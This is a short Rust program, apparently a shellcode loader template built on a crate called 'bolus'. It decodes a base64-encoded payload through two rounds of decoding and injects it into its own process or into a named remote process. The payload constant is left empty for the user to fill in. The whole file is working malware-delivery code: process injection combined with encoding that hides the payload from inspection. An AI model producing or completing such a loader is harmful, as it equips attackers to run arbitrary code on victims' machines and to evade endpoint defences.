
extern crate bolus;

use bolus::{
    inject,
    injectors::{InjectionType, InjectorType},
    load,
};


/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 2;
/// If not blank, the process name to inject into
const PROCESS_NAME: &str = "";
/// `WaitForSingleObject` Switch. Usually you want this
const WAIT_FOR_SINGLE_OBJECT: bool = true;
/// `IgnoreSSL` switch. 
const IGNORE_SSL: bool = true;

fn main() -> Result<(), String> {
    let injection_type = match PROCESS_NAME {
        "" => InjectionType::Reflect,
        _ => InjectionType::Remote(PROCESS_NAME.to_string()),
    };
    let injector = load(
        InjectorType::Base64Embedded((
            SC.to_string(),
            B64_ITERATIONS
        ))
    )?;
    inject(
        injector,
        injection_type,
        WAIT_FOR_SINGLE_OBJECT
    )
}

const SC: &str = "";